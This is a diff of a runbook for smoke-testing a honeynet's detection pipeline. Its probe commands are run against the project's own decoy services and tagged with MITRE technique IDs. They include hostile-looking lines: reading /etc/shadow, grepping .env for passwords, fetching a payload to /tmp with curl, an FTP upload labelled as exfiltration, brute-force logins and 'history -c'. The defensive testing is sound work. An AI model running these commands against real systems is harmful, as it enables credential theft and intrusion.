-# Malware/tool download request.
-curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true
+curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true # Malware/tool download request.
 
-# Malware upload/drop endpoint note.
-curl -i "http://146.169.44.23:18085/upload/README.txt" || true
+curl -i "http://146.169.44.23:18085/upload/README.txt" || true # Malware upload/drop endpoint note.
 
 # OpenCanary / protocol assets
-# Git repository discovery.
-timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git || true
+timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git || true # Git repository discovery.
 
 # Redis service discovery.
 printf "INFO\r\n" | nc -w 2 146.169.44.23 16379 || true
@@ -492,8 +398,7 @@ printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" |
 # FTP upload/exfiltration-shaped attempt.
 printf "USER anonymous\r\nPASS anonymous\r\nSTOR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true
 
-# SSH credential attempt against the canary.
-timeout 8s ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true
+timeout 8s ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true # SSH credential attempt against the canary.
 
 # Telnet login prompt interaction.
 { sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 146.169.44.23 12323 || true
@@ -527,11 +432,9 @@ PY
 Check:
 
 ```bash
-# Let internal HTTP/protocol forwarders and profiler process events.
-sleep 3
+sleep 3 # Let internal HTTP/protocol forwarders and profiler process events.
 
-# Inspect routes, recent protocol observations, and the resulting attacker profile.
-curl -s "http://146.169.44.23:8090/api/summary" | jq '{asset_gateway_routes, recent_opencanary_observations, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, internal_http_evidence, unlocked_assets}]}'
+curl -s "http://146.169.44.23:8090/api/summary" | jq '{asset_gateway_routes, recent_opencanary_observations, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, internal_http_evidence, unlocked_assets}]}' # Inspect routes, recent protocol observations, and the resulting attacker profile.
 
 # Require observed telemetry for every fixed-port asset touched in this smoke.
 .venv/bin/python scripts/validation/asset_telemetry.py \
@@ -563,22 +466,18 @@ TEST_ATTACKER_KEY="$(
     jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
 )"
 
-# Force-unlock Dionaea and generic capture backends.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh --assets dionaea-capture,honeytrap-generic
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh --assets dionaea-capture,honeytrap-generic # Force-unlock Dionaea and generic capture backends.
 
-# Give Docker backends and sidecar forwarders time to start.
-sleep 10
+sleep 10 # Give Docker backends and sidecar forwarders time to start.
 
-# Verify gateway routes for the two high-interaction assets.
-jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip and (.asset_id == "dionaea-capture" or .asset_id == "honeytrap-generic")) | {asset_id, public_port, backend_host, backend_port}]' data/runtime/asset_gateway_routes.json
+jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip and (.asset_id == "dionaea-capture" or .asset_id == "honeytrap-generic")) | {asset_id, public_port, backend_host, backend_port}]' data/runtime/asset_gateway_routes.json # Verify gateway routes for the two high-interaction assets.
 ```
 
 Probe the high-interaction routes:
 
 ```bash
 # Dionaea HTTP/SMB/MSSQL/FTP-facing ports
-# Dionaea HTTP payload/download-like request.
-curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true
+curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true # Dionaea HTTP payload/download-like request.
 
 # Dionaea SMB-facing probe.
 printf "\x00\x00\x00\x90" | nc -w 3 146.169.44.23 1445 || true
@@ -597,14 +496,11 @@ printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true
 Check:
 
 ```bash
-# Let high-interaction forwarders ingest backend/gateway probe events.
-sleep 5
+sleep 5 # Let high-interaction forwarders ingest backend/gateway probe events.
 
-# Check dashboard-facing high-interaction observations and profile updates.
-curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_high_interaction_observations, high_interaction_events: .event_counts.high_interaction, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, unlocked_assets}]}'
+curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_high_interaction_observations, high_interaction_events: .event_counts.high_interaction, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, unlocked_assets}]}' # Check dashboard-facing high-interaction observations and profile updates.
 
-# Require observed telemetry for the high-interaction assets.
-.venv/bin/python scripts/validation/asset_telemetry.py --asset-id dionaea-capture --asset-id honeytrap-generic --require-observed
+.venv/bin/python scripts/validation/asset_telemetry.py --asset-id dionaea-capture --asset-id honeytrap-generic --require-observed # Require observed telemetry for the high-interaction assets.
 ```
 
 Expected: the selected assets have runtime records, asset-gateway routes, dashboard running state, and either `recent_high_interaction_observations` or raw high-interaction/internal HTTP telemetry. If a runtime fails, the validation report should show the failed asset instead of silently passing.
@@ -616,18 +512,15 @@ Run the HTTP, protocol, and Cowrie blocks after section 4 and before section 6 i
 Set the target once:
 
 ```bash
-# Public VM host used by all probes in this section.
-TARGET="146.169.44.23"
+TARGET="146.169.44.23" # Public VM host used by all probes in this section.
 
-# Dashboard/API endpoint used for final profile checks.
-DASHBOARD="http://${TARGET}:8090"
+DASHBOARD="http://${TARGET}:8090" # Dashboard/API endpoint used for final profile checks.
 ```
 
 HTTP surfaces:
 
 ```bash
-# Internal portal, admin, VPN, finance, and malware sink HTTP paths
-curl -i "http://${TARGET}:18080/directory/hosts.csv" || true                         # T1018
+curl -i "http://${TARGET}:18080/directory/hosts.csv" || true                         # T1018 # Internal portal, admin, VPN, finance, and malware sink HTTP paths
 curl -i -X POST "http://${TARGET}:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window&auth_result=success" || true  # T1021, T1078
 curl -i "http://${TARGET}:18081/api/processes.json" || true                         # T1057
 curl -i "http://${TARGET}:18081/api/groups.json" || true                            # T1069
@@ -646,8 +539,7 @@ curl -i "http://${TARGET}:18443/policy/tunnel-routes.txt" || true               
 Protocol surfaces:
 
 ```bash
-# Git, Redis, FTP, SSH, Telnet, SMTP, and MySQL-facing lures
-timeout 8s git ls-remote "git://${TARGET}:19418/infra-deploy.git" || true            # T1213
+timeout 8s git ls-remote "git://${TARGET}:19418/infra-deploy.git" || true            # T1213 # Git, Redis, FTP, SSH, Telnet, SMTP, and MySQL-facing lures
 printf "INFO\r\n" | nc -w 2 "$TARGET" 16379 || true                                  # T1046
 printf "KEYS *\r\n" | nc -w 2 "$TARGET" 16379 || true                                # T1213
 printf "GET session:portal.reader\r\n" | nc -w 2 "$TARGET" 16379 || true              # T1005
@@ -688,54 +580,39 @@ printf "payload upload test\r\n" | nc -w 3 "$TARGET" 19999 || true              
 Cowrie command surface:
 
 ```bash
-# Open an interactive Cowrie jumpbox session after the admin-jumpbox route exists.
-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@"$TARGET"
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@"$TARGET" # Open an interactive Cowrie jumpbox session after the admin-jumpbox route exists.
 ```
 
 Run these inside the Cowrie shell:
 
 ```bash
-# Current user discovery.
-whoami
+whoami # Current user discovery.
 
-# User/group discovery.
-id
+id # User/group discovery.
 
-# System discovery.
-uname -a
+uname -a # System discovery.
 
-# File/directory discovery.
-ls -la /tmp
+ls -la /tmp # File/directory discovery.
 
-# Network configuration discovery.
-ip addr
+ip addr # Network configuration discovery.
 
-# Alternative network configuration discovery command.
-ifconfig
+ifconfig # Alternative network configuration discovery command.
 
-# Credential-dumping style sensitive file access.
-cat /etc/shadow
+cat /etc/shadow # Credential-dumping style sensitive file access.
 
-# Credential-in-file search.
-grep password .env
+grep password .env # Credential-in-file search.
 
-# Privilege escalation check.
-sudo -l
+sudo -l # Privilege escalation check.
 
-# Scheduled task discovery.
-crontab -l
+crontab -l # Scheduled task discovery.
 
-# Interactive shell execution.
-bash -i
+bash -i # Interactive shell execution.
 
-# Tool download from malware sink/Dionaea route.
-curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin
+curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin # Tool download from malware sink/Dionaea route.
 
-# Indicator removal.
-history -c
+history -c # Indicator removal.
 
-# End the Cowrie session.
-exit
+exit # End the Cowrie session.
 ```
 
 Expected Cowrie techniques include `T1003`, `T1016`, `T1033`, `T1053`, `T1059`, `T1070`, `T1082`, `T1083`, `T1105`, `T1548`, and `T1552.001`.
@@ -749,8 +626,7 @@ ask="$(mktemp)"
 # Feed a dummy password to Cowrie.
 printf '#!/bin/sh\necho root\n' > "$ask"
 
-# Make the askpass helper executable.
-chmod +x "$ask"
+chmod +x "$ask" # Make the askpass helper executable.
 
 # Send a sequence of shell commands into Cowrie to exercise command mappings.
 {
@@ -790,21 +666,17 @@ chmod +x "$ask"
     -o UserKnownHostsFile=/dev/null \
     -p 10222 root@"$TARGET" || true
 
-# Remove the temporary askpass helper.
-rm -f "$ask"
+rm -f "$ask" # Remove the temporary askpass helper.
 ```
 
 Check the evidence-level result:
 
 ```bash
-# Wait for all forwarders and adapters to flush events into the profiler.
-sleep 5
+sleep 5 # Wait for all forwarders and adapters to flush events into the profiler.
 
-# Expected technique set for the manual coverage smoke.
-REQUIRED='["T1003","T1005","T1016","T1018","T1021","T1021.004","T1033","T1039","T1041","T1046","T1053","T1057","T1059","T1069","T1070","T1074","T1078","T1082","T1083","T1087.003","T1105","T1110","T1133","T1190","T1204.002","T1213","T1518","T1548","T1552.001","T1567","T1567.002","T1572","T1608"]'
+REQUIRED='["T1003","T1005","T1016","T1018","T1021","T1021.004","T1033","T1039","T1041","T1046","T1053","T1057","T1059","T1069","T1070","T1074","T1078","T1082","T1083","T1087.003","T1105","T1110","T1133","T1190","T1204.002","T1213","T1518","T1548","T1552.001","T1567","T1567.002","T1572","T1608"]' # Expected technique set for the manual coverage smoke.
 
-# Compare persisted evidence against the required technique set.
-jq --argjson required "$REQUIRED" '
+jq --argjson required "$REQUIRED" ' # Compare persisted evidence against the required technique set.
   (.records // {}) as $records |
   [
     (
@@ -856,25 +728,19 @@ docker logs --tail 50 honeynet_opencanary-forwarder_1
 # High-interaction forwarder logs.
 docker logs --tail 50 honeynet_high-interaction-forwarder_1
 
-# Raw public portal access log.
-tail -n 20 deploy/public-portal/logs/access.log
+tail -n 20 deploy/public-portal/logs/access.log # Raw public portal access log.
 
-# Gateway-captured internal HTTP events.
-tail -n 20 data/runtime/internal_http_events.jsonl
+tail -n 20 data/runtime/internal_http_events.jsonl # Gateway-captured internal HTTP events.
 
-# Gateway-captured protocol events.
-tail -n 20 data/runtime/internal_protocol_events.jsonl
+tail -n 20 data/runtime/internal_protocol_events.jsonl # Gateway-captured protocol events.
 
-# Gateway/forwarder high-interaction events.
-tail -n 20 data/runtime/high_interaction_events.jsonl
+tail -n 20 data/runtime/high_interaction_events.jsonl # Gateway/forwarder high-interaction events.
 
-# Current source-IP route table consumed by asset-gateway.
-cat data/runtime/asset_gateway_routes.json | jq
+cat data/runtime/asset_gateway_routes.json | jq # Current source-IP route table consumed by asset-gateway.
 ```
 
 ## 9. Cleanup
 
 ```bash
-# Stop runtime containers and clear generated state.
-./scripts/reset_enterprise_runtime.sh
+./scripts/reset_enterprise_runtime.sh # Stop runtime containers and clear generated state.
 ```
